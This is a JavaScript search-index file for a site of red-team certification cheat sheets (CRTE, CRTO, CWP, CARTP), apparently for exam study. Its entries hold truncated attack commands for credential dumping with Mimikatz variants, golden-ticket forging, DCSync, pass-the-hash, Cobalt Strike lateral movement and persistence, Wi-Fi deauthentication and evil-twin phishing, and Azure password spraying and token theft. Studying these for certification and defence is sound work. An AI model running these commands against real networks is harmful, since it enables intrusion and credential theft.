window.__searchIndex=[{"cheatsheet":"CRTE","section":"AD Module","sectionId":"enumeration","lang":"PowerShell","text":"Import-Module Microsoft.ActiveDirectory.Management.dll Import-Module ActiveDirectory.psd1","url":"crte-cheatsheet.html#enumeration"},{"cheatsheet":"CRTE","section":"PowerUp","sectionId":"privesc","lang":"PowerShell","text":". .\\PowerUp.ps1 Invoke-AllChecks Invoke-ServiceAbuse -Name <SERVICE> -UserName <DOMAIN>\\<USER> -Verbose","url":"crte-cheatsheet.html#privesc"},{"cheatsheet":"CRTE","section":"Enumeration","sectionId":"laps","lang":"PowerShell","text":"Import-Module AdmPwd.PS.psd1 -Verbose Get-LapsPermissions.ps1","url":"crte-cheatsheet.html#laps"},{"cheatsheet":"CRTE","section":"Copy Loader &amp; Dump Credentials","sectionId":"credentials","lang":"CMD","text":"# Copy loader to target echo F | xcopy Loader.exe \\\\<TARGET>\\C$\\Users\\Public\\Loader.exe # Setup port forwarding to avoid detection winrs -r:<TARGET> -u:.\\administrator -p:<PASSWORD> cmd netsh interfac","url":"crte-cheatsheet.html#credentials"},{"cheatsheet":"CRTE","section":"gMSA - Group Managed Service Accounts","sectionId":"gmsa","lang":"PowerShell - Enumerate gMSA","text":"Get-ADServiceAccount -Filter * Get-ADServiceAccount -Identity <GMSA_ACCOUNT> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword","url":"crte-cheatsheet.html#gmsa"},{"cheatsheet":"CRTE","section":"OverPass-The-Hash (Elevated Shell)","sectionId":"pth","lang":"CMD","text":"# Using AES256 SafetyKatz.exe \"sekurlsa::opassth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_HASH> /run:cmd.exe\" \"exit\" # Using NTLM SafetyKatz.exe \"sekurlsa::opassth /user:<USER> /domain:<DOMAIN> /","url":"crte-cheatsheet.html#pth"},{"cheatsheet":"CRTE","section":"AppLocker, CLM &amp; WDAC","sectionId":"applocker","lang":"PowerShell","text":"# Check if PowerShell is in Constrained Language Mode $ExecutionContext.SessionState.LanguageMode # Check AppLocker (error = not in use) reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2 Get-Ap","url":"crte-cheatsheet.html#applocker"},{"cheatsheet":"CRTE","section":"Find Unconstrained Delegation","sectionId":"unconstrained","lang":"PowerShell","text":"Get-ADComputer -Filter {TrustedForDelegation -eq $True}","url":"crte-cheatsheet.html#unconstrained"},{"cheatsheet":"CRTE","section":"Find Constrained Delegation","sectionId":"constrained","lang":"PowerShell","text":"Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo # Cross-forest Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDe","url":"crte-cheatsheet.html#constrained"},{"cheatsheet":"CRTE","section":"Enumerate ACL Permissions","sectionId":"acl","lang":"PowerShell","text":"Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<USER>'}","url":"crte-cheatsheet.html#acl"},{"cheatsheet":"CRTE","section":"Golden Ticket","sectionId":"tickets","lang":"CMD - BetterSafetyKatz","text":"BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\" klist","url":"crte-cheatsheet.html#tickets"},{"cheatsheet":"CRTE","section":"Check Replication Rights","sectionId":"dcsync","lang":"PowerShell","text":"Get-DomainObjectAcl -SearchBase \"dc=<DOMAIN>,dc=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Obj","url":"crte-cheatsheet.html#dcsync"},{"cheatsheet":"CRTE","section":"Enumerate Certificate Authorities","sectionId":"adcs","lang":"CMD","text":"Certify.exe cas Certify.exe find Certify.exe find /enrolleeSuppliesSubject","url":"crte-cheatsheet.html#adcs"},{"cheatsheet":"CRTE","section":"Find MSOL Account","sectionId":"azuread","lang":"PowerShell","text":"Get-ADUser -Filter \"samAccountName -like 'MSOL_*'\" -Server <DOMAIN> -Properties * | select SamAccountName,Description | fl","url":"crte-cheatsheet.html#azuread"},{"cheatsheet":"CRTE","section":"Extract Trust Key","sectionId":"domainprivesc","lang":"CMD","text":"# Access DC with DA privileges Rubeus.exe asktgt /user:administrator /aes256:<AES256_HASH> /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt # Copy loader and dump trust keys echo F | xcopy","url":"crte-cheatsheet.html#domainprivesc"},{"cheatsheet":"CRTE","section":"Forge Inter-Realm TGT","sectionId":"foresttrust","lang":"CMD","text":"BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<TRUST_RC4> /service:krbtgt /target:<FOREIGN_DOMAIN> /sids:<FOREIGN_EA_SID>-519 /ticket:cross_forest.","url":"crte-cheatsheet.html#foresttrust"},{"cheatsheet":"CRTE","section":"Enumerate SQL Links","sectionId":"mssql","lang":"PowerShell - PowerUpSQL","text":"Import-Module PowerupSQL.psd1 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Get-SQLServerLink -Instance <SQL_SERVER> -Verbose Get-SQLServerLinkCrawl -Instance <SQL_SERVER> -Verbose # Execute comm","url":"crte-cheatsheet.html#mssql"},{"cheatsheet":"CRTE","section":"Foreign Security Principals","sectionId":"fsp","lang":"PowerShell","text":"# Enumerate trust relationships Get-ForestTrust # Look for: TrustType = Forest, TrustDirection = Bidirectional # Find interesting ACLs in foreign domain Find-InterestingDomainAcl -ResolveGUIDs -Domain","url":"crte-cheatsheet.html#fsp"},{"cheatsheet":"CRTE","section":"Enumerate Foreign Security Principals","sectionId":"pam","lang":"PowerShell","text":"Get-ADObject -Filter {objectClass -eq \"foreignSecurityPrincipal\"} -Server <DOMAIN> # Find which DA group the FSP belongs to Get-ADGroup -Filter * -Properties Member -Server <DOMAIN> | ?{$_.Member -mat","url":"crte-cheatsheet.html#pam"},{"cheatsheet":"CRTE","section":"BloodHound Collection","sectionId":"recurring","lang":"CMD","text":"SharpHound.exe --CollectionMethods All","url":"crte-cheatsheet.html#recurring"},{"cheatsheet":"CRTO","section":"Artifact Kit Build","sectionId":"c2setup","lang":"Bash","text":"# Artifact Kit Build ./build.sh pipe VirtualAlloc 310272 5 false false none /path/to/artifacts # Resource Kit Build ./build.sh /path/to/resources # Mimikatz Kit Build ./build.sh /path/to/mimikatz","url":"crto-cheatsheet.html#c2setup"},{"cheatsheet":"CRTO","section":"Session Passing &amp; File Operations","sectionId":"postexploitation","lang":"Cobalt Strike","text":"# Session passing spawn x64 <LISTENER> # File operations cd C:\\Users\\<USER>\\Desktop ls download <FILE> downloads # Process listing ps","url":"crto-cheatsheet.html#postexploitation"},{"cheatsheet":"CRTO","section":"Registry Run Key","sectionId":"hostpersistence","lang":"PowerShell","text":"Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"<NAME>\" -Value \"<PAYLOAD_PATH>\"","url":"crto-cheatsheet.html#hostpersistence"},{"cheatsheet":"CRTO","section":"Check Current Integrity","sectionId":"privesc","lang":"Cobalt Strike","text":"powershell [Security.Principal.WindowsIdentity]::GetCurrent().Groups | ? {$_.Value -eq \"S-1-16-12288\"}","url":"crto-cheatsheet.html#privesc"},{"cheatsheet":"CRTO","section":"Scheduled Task as SYSTEM","sectionId":"elevatedpersistence","lang":"CMD","text":"schtasks /create /tn \"<TASK_NAME>\" /tr \"<PAYLOAD_PATH>\" /sc onstart /ru SYSTEM","url":"crto-cheatsheet.html#elevatedpersistence"},{"cheatsheet":"CRTO","section":"Mimikatz via Cobalt Strike","sectionId":"credtheft","lang":"Cobalt Strike","text":"# Mimikatz - combine commands with \";\" mimikatz token::elevate ; lsadump::sam # Logon passwords (NTLM hashes) mimikatz !sekurlsa::logonpasswords # Kerberos encryption keys mimikatz !sekurlsa::ekeys # ","url":"crto-cheatsheet.html#credtheft"},{"cheatsheet":"CRTO","section":"Pass the Hash &amp; Make Token","sectionId":"impersonation","lang":"Cobalt Strike","text":"# Pass the Hash pth <DOMAIN>\\<USER> <NTLM_HASH> # Make Token (plaintext password) make_token <DOMAIN>\\<USER> <PASSWORD>","url":"crto-cheatsheet.html#impersonation"},{"cheatsheet":"CRTO","section":"PowerView","sectionId":"domainrecon","lang":"Cobalt Strike","text":"powershell-import C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1 powerpick Get-Domain powerpick Get-DomainController | select Forest, Name, OSVersion | fl powerpick Get-DomainUser -Identity <USER> -Properti","url":"crto-cheatsheet.html#domainrecon"},{"cheatsheet":"CRTO","section":"WinRM &amp; PsExec","sectionId":"lateralmovement","lang":"Cobalt Strike","text":"# WinRM jump winrm64 <TARGET>.<DOMAIN> <LISTENER> # PsExec jump psexec64 <TARGET>.<DOMAIN> <LISTENER>","url":"crto-cheatsheet.html#lateralmovement"},{"cheatsheet":"CRTO","section":"Spawn &amp; SpawnAs","sectionId":"sessionpassing","lang":"Cobalt Strike","text":"# Spawn new beacon (same or different listener) spawn x64 <LISTENER> spawn x86 <LISTENER> # Spawn as different user spawnas <DOMAIN>\\<USER> <PASSWORD> <LISTENER>","url":"crto-cheatsheet.html#sessionpassing"},{"cheatsheet":"CRTO","section":"SOCKS Proxy","sectionId":"pivoting","lang":"Cobalt Strike","text":"socks 1080 socks 1080 socks5 disableNoAuth <USER> <PASSWORD> enableLogging","url":"crto-cheatsheet.html#pivoting"},{"cheatsheet":"CRTO","section":"Kerberoasting &amp; AS-REP Roasting","sectionId":"kerberos","lang":"Cobalt Strike","text":"# Kerberoasting execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe kerberoast /user:<SERVICE_USER> /nowrap # AS-REP Roasting execute-assembly C:\\Tools\\Rubeus\\Rubeus.exe asreproast /user:<USER> /nowrap","url":"crto-cheatsheet.html#kerberos"},{"cheatsheet":"CRTO","section":"Enumerate Certificate Authorities","sectionId":"adcs","lang":"Cobalt Strike","text":"# Find Certificate Authorities execute-assembly C:\\Tools\\Certify\\Certify.exe cas # Find vulnerable templates execute-assembly C:\\Tools\\Certify\\Certify.exe find /vulnerable","url":"crto-cheatsheet.html#adcs"},{"cheatsheet":"CRTO","section":"Find Modifiable GPOs","sectionId":"gpoabuse","lang":"Cobalt Strike","text":"powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"<SID>\" }","url":"crto-cheatsheet.html#gpoabuse"},{"cheatsheet":"CRTO","section":"Find Credential Files","sectionId":"dpapi","lang":"Cobalt Strike","text":"ls C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\ ls C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\","url":"crto-cheatsheet.html#dpapi"},{"cheatsheet":"CRTO","section":"Enumerate SQL Instances","sectionId":"mssql","lang":"Cobalt Strike","text":"powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo","url":"crto-cheatsheet.html#mssql"},{"cheatsheet":"CRTO","section":"SCCM Enumeration","sectionId":"sccm","lang":"Cobalt Strike","text":"execute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM.exe local site-info execute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM.exe get collections execute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM.exe get collection-mem","url":"crto-cheatsheet.html#sccm"},{"cheatsheet":"CRTO","section":"DCSync","sectionId":"domaindominance","lang":"Cobalt Strike","text":"dcsync <DOMAIN> <DOMAIN>\\krbtgt mimikatz @lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\\krbtgt","url":"crto-cheatsheet.html#domaindominance"},{"cheatsheet":"CRTO","section":"Enumerate Trusts","sectionId":"trusts","lang":"Cobalt Strike","text":"powerpick Get-DomainTrust execute-assembly C:\\Tools\\ADSearch\\ADSearch.exe --search \"(objectCategory=trustedDomain)\" --domain <DOMAIN> --attributes distinguishedName,name,flatName,trustDirection","url":"crto-cheatsheet.html#trusts"},{"cheatsheet":"CRTO","section":"Identify LAPS GPOs","sectionId":"laps","lang":"Cobalt Strike","text":"powerpick Get-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath","url":"crto-cheatsheet.html#laps"},{"cheatsheet":"CRTO","section":"Bypass ConstrainedLanguage Mode","sectionId":"evasion","lang":"Cobalt Strike","text":"powershell $ExecutionContext.SessionState.LanguageMode # If ConstrainedLanguage, use: powerpick $ExecutionContext.SessionState.LanguageMode # Returns: FullLanguage","url":"crto-cheatsheet.html#evasion"},{"cheatsheet":"CRTO","section":"Find Accessible Shares","sectionId":"datahunting","lang":"Cobalt Strike","text":"powerpick Find-DomainShare -CheckShareAccess","url":"crto-cheatsheet.html#datahunting"},{"cheatsheet":"CWP","section":"Gesti&oacute;n de Interfaces","sectionId":"recon","lang":"Bash","text":"# Configurar interfaz en un canal específico iwconfig wlan0mon channel <CHANNEL> # Deshabilitar el gestor de interfaces sudo systemctl stop NetworkManager # Verificar modo monitor iwconfig # Monitoriz","url":"cwp-cheatsheet.html#recon"},{"cheatsheet":"CWP","section":"Modo Monitor &amp; Comandos B&aacute;sicos","sectionId":"aircrack","lang":"Bash","text":"# Activar modo monitor sudo airmon-ng start wlan0 # Matar procesos que interfieren sudo airmon-ng check kill # Capturar paquetes sudo airodump-ng wlan0mon # Volver a modo gestionado sudo airmon-ng sto","url":"cwp-cheatsheet.html#aircrack"},{"cheatsheet":"CWP","section":"Detecci&oacute;n de Redes Ocultas","sectionId":"analysis","lang":"Bash","text":"# Detectar con iwlist sudo iwlist wlan0 scan # Detectar con airodump-ng sudo airodump-ng wlan0mon # Brute force SSIDs ocultos con mdk4 mdk4 wlan0mon p -t <BSSID> -f <ESSID_DICTIONARY>","url":"cwp-cheatsheet.html#analysis"},{"cheatsheet":"CWP","section":"Cracking WPA/WPA2-PSK","sectionId":"cracking","lang":"Bash","text":"# Hashcat - modo 22000 (WPA-PBKDF2-PMKID+EAPOL) hashcat -m 22000 <HASH_FILE>.hccapx -a 0 -w 3 <WORDLIST> # Aircrack-ng con wordlist aircrack-ng -w <WORDLIST> -b <BSSID> <CAPTURE_FILE>.cap # Aircrack-n","url":"cwp-cheatsheet.html#cracking"},{"cheatsheet":"CWP","section":"Enumerar Redes Abiertas","sectionId":"opn","lang":"Bash","text":"# Enumerar redes sudo airodump-ng wlan0 # Capturar tráfico de un AP específico sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0","url":"cwp-cheatsheet.html#opn"},{"cheatsheet":"CWP","section":"Ataques B&aacute;sicos WEP","sectionId":"wep","lang":"Bash","text":"# Autenticación falsa aireplay-ng -1 0 -a <AP_MAC> -h <CLIENT_MAC> <IFACE> # Ataque de repetición ARP (arpreplay) aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> <IFACE> # Ataque de desautenticación airepl","url":"cwp-cheatsheet.html#wep"},{"cheatsheet":"CWP","section":"Captura de Handshake + Desautenticaci&oacute;n","sectionId":"psk","lang":"Bash","text":"# SHELL 1 - Capturar handshake sudo airmon-ng start wlan0 sudo airodump-ng wlan0mon -w <OUTPUT> -c <CHANNEL> # SHELL 2 - Forzar desautenticación sudo aireplay-ng -0 10 -a <AP_BSSID> wlan0mon # Si no f","url":"cwp-cheatsheet.html#psk"},{"cheatsheet":"CWP","section":"Configurar Fake AP con hostapd-mana","sectionId":"eviltwin","lang":"Bash","text":"# Archivo hostapd.conf interface=<IFACE> driver=nl80211 hw_mode=g channel=<CHANNEL> ssid=<TARGET_SSID> mana_wpaout=hostapd.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345","url":"cwp-cheatsheet.html#eviltwin"},{"cheatsheet":"CWP","section":"Fuerza Bruta Online contra WPA3-SAE","sectionId":"sae","lang":"Bash","text":"# Capturar redes y crear base de datos sudo airodump-ng wlan0 -w <OUTPUT_DIR>/ --gpsd python3 wifi_db.py -d database.sqlite <OUTPUT_DIR>/ # Verificar frecuencia del AP sudo iwlist wlan0 frequency | gr","url":"cwp-cheatsheet.html#sae"},{"cheatsheet":"CWP","section":"Identity Harvesting (Captura de Identidades EAP)","sectionId":"mgtrecon","lang":"Bash","text":"# Modo monitor y captura sudo airmon-ng start wlan0 sudo airodump-ng wlan0mon -w <OUTPUT> --gpsd --band abg # Capturar solo en el canal del objetivo sudo airodump-ng wlan0mon -w <OUTPUT> -c <CHANNEL> ","url":"cwp-cheatsheet.html#mgtrecon"},{"cheatsheet":"CWP","section":"Crear Certificado Falso para el AP","sectionId":"mgteviltwin","lang":"Bash","text":"# Obtener campos del certificado original bash pcapFilter.sh -C -f <CAPTURE>.cap # Crear certificado falso con eaphammer cd /root/tools/eaphammer python3 ./eaphammer --cert-wizard","url":"cwp-cheatsheet.html#mgteviltwin"},{"cheatsheet":"CWP","section":"Fuerza Bruta con Air-Hammer","sectionId":"mgtbrute","lang":"Bash","text":"# Crear archivo de usuario echo '<DOMAIN>\\<USER>' > target.user # Fuerza bruta con air-hammer ./air-hammer.py -i <IFACE> -e <TARGET_SSID> -p <WORDLIST> -u target.user","url":"cwp-cheatsheet.html#mgtbrute"},{"cheatsheet":"CWP","section":"Preparar MAC del AP Falso","sectionId":"mgtrelay","lang":"Bash","text":"# Cambiar MAC para simular AP legítimo sudo systemctl stop network-manager sudo airmon-ng stop wlan1mon sudo ip link set wlan1 down sudo macchanger -m <AP_MAC> wlan1 sudo ip link set wlan1 up","url":"cwp-cheatsheet.html#mgtrelay"},{"cheatsheet":"CWP","section":"Rogue AP + Captive Portal (Phishing)","sectionId":"mgtrogue","lang":"Bash","text":"# SHELL 1 - Crear AP malicioso con portal cautivo cd ~/tools/eaphammer sudo killall dnsmasq ./eaphammer --essid <PROBE_SSID> --interface <IFACE> --captive-portal # SHELL 2 - Desautenticar al cliente s","url":"cwp-cheatsheet.html#mgtrogue"},{"cheatsheet":"CARTP","section":"Tenant Discovery (Unauthenticated)","sectionId":"discovery","lang":"URLs / API","text":"# Check if tenant exists & get federation info https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1 # Get Tenant ID https://login.microsoftonline.com/<DOMAIN>/.well-known/ope","url":"cartp-cheatsheet.html#discovery"},{"cheatsheet":"CARTP","section":"AzureAD Module - Connect &amp; User Enumeration","sectionId":"userenum","lang":"PowerShell","text":"# Import and connect Import-Module C:\\AzAD\\Tools\\AzureAD\\AzureAD.psd1 $passwd = ConvertTo-SecureString \"<PASSWORD>\" -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential(\"<","url":"cartp-cheatsheet.html#userenum"},{"cheatsheet":"CARTP","section":"Application Enumeration","sectionId":"apps","lang":"PowerShell","text":"# All application objects Get-AzureADApplication -All $true Get-AzureADApplication -All $true | ?{$_.DisplayName -match \"app\"} # Application password credentials Get-AzureADApplicationPasswordCredenti","url":"cartp-cheatsheet.html#apps"},{"cheatsheet":"CARTP","section":"Directory Roles","sectionId":"roles","lang":"PowerShell","text":"# All role templates Get-AzureADDirectoryRoleTemplate # Enabled roles Get-AzureADDirectoryRole # Members of Global Administrator role Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Administr","url":"cartp-cheatsheet.html#roles"},{"cheatsheet":"CARTP","section":"Connect &amp; Context","sectionId":"azpowershell","lang":"PowerShell","text":"# Connect with credentials $creds = Get-Credential Connect-AzAccount -Credential $creds # Current context and subscriptions Get-AzContext Get-AzContext -ListAvailable Get-AzSubscription","url":"cartp-cheatsheet.html#azpowershell"},{"cheatsheet":"CARTP","section":"Login &amp; Account Info","sectionId":"azcli","lang":"Bash / CMD","text":"# Login with credentials az login -u <USER>@<DOMAIN> -p <PASSWORD> # Login without subscription az login -u <USER>@<DOMAIN> -p <PASSWORD> --allow-no-subscriptions # Login with Managed Identity az logi","url":"cartp-cheatsheet.html#azcli"},{"cheatsheet":"CARTP","section":"MSOLSpray - Password Spraying","sectionId":"spray","lang":"PowerShell","text":"# MSOLSpray - Brute force Azure AD . C:\\AzAD\\Tools\\MSOLSpray\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList C:\\AzAD\\Tools\\validemails.txt -Password \"<PASSWORD>\" -Verbose","url":"cartp-cheatsheet.html#spray"},{"cheatsheet":"CARTP","section":"Illicit Consent Grant Attack","sectionId":"phishing","lang":"PowerShell","text":"# Check if users can consent to apps (AzureADPreview) (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole # If output = ManagePermissionGrantsForSelf.microsoft-user-de","url":"cartp-cheatsheet.html#phishing"},{"cheatsheet":"CARTP","section":"Dynamic Group Abuse","sectionId":"privesc","lang":"PowerShell","text":"# Check for Dynamic Membership groups Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} # Abuse: change user email to match dynamic rule # Example: if rule matches \"*vendor*\" in OtherMails","url":"cartp-cheatsheet.html#privesc"},{"cheatsheet":"CARTP","section":"VM Command Execution","sectionId":"lateral","lang":"PowerShell","text":"# Execute command on Azure VM (Az PowerShell) Invoke-AzVMRunCommand -VMName <VM_NAME> -ResourceGroupName <RG_NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<SCRIPT_PATH>' -Verbose # Execute comma","url":"cartp-cheatsheet.html#lateral"},{"cheatsheet":"CARTP","section":"PHS (Password Hash Sync) Abuse","sectionId":"adconnect","lang":"PowerShell","text":"# On the AD Connect server, extract sync credentials Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1 Get-AADIntSyncCredentials # Extracts MSOL_* and Sync_* account creden","url":"cartp-cheatsheet.html#adconnect"},{"cheatsheet":"CARTP","section":"Storage Account &amp; Blob Abuse","sectionId":"resources","lang":"PowerShell","text":"# Enumerate storage accounts Get-AzStorageAccount | fl # Enumerate blobs . C:\\AzAD\\Tools\\MicroBurst\\Misc\\Invoke-EnumerateAzureBlobs.ps1 Invoke-EnumerateAzureBlobs -Base <TARGET_BASE> # List containers","url":"cartp-cheatsheet.html#resources"},{"cheatsheet":"CARTP","section":"ROADTools","sectionId":"enumtools","lang":"CMD / Python","text":"# ROADRecon - Azure AD enumeration cd C:\\AzAD\\Tools\\ROADTools pipenv shell # Authenticate roadrecon auth -u <USER>@<DOMAIN> -p <PASSWORD> # Gather data and launch GUI roadrecon gather roadrecon gui","url":"cartp-cheatsheet.html#enumtools"},{"cheatsheet":"CARTP","section":"Request Nonce","sectionId":"prt","lang":"PowerShell","text":"# Request a nonce for PRT $TenantId = \"<TENANT_ID>\" $URL = \"https://login.microsoftonline.com/$TenantId/oauth2/token\" $Params = @{ \"URI\" = $URL \"Method\" = \"POST\" } $Body = @{ \"grant_type\" = \"srv_chall","url":"cartp-cheatsheet.html#prt"},{"cheatsheet":"CARTP","section":"Application Proxy Enumeration","sectionId":"proxy","lang":"PowerShell","text":"# Enumerate Application Proxy apps Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}} # Get service principal for the app G","url":"cartp-cheatsheet.html#proxy"},{"cheatsheet":"CARTP","section":"Function App Token Extraction","sectionId":"github","lang":"Python / PowerShell","text":"# Modify function code to extract Managed Identity token import logging, os import azure.functions as func def main(req: func.HttpRequest) -> func.HttpResponse: logging.info('Python HTTP trigger funct","url":"cartp-cheatsheet.html#github"}];